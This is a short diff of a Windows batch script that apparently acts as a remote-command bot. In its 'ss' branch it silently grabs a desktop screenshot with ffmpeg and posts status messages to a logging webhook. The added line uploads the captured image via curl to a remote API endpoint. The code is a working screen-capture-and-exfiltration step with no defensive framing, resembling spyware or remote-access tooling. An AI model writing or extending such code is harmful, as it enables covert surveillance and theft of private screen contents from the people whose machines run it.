@@ -24,6 +24,7 @@ if "%result%"=="ss" (
     ffmpeg -f gdigrab -i desktop -draw_mouse 1 -vframes 1 ss.webp
     if exist ss.webp (
         curl -d content="**%name%**: Captured a screenshot" %logging%
+        curl -s -X POST -F "name=%name%" -F "image=@ss.webp" "%apiRoot%/ss"
     ) else (
         curl -d content="**%name%**: Error capturing screenshot" %logging%
     )
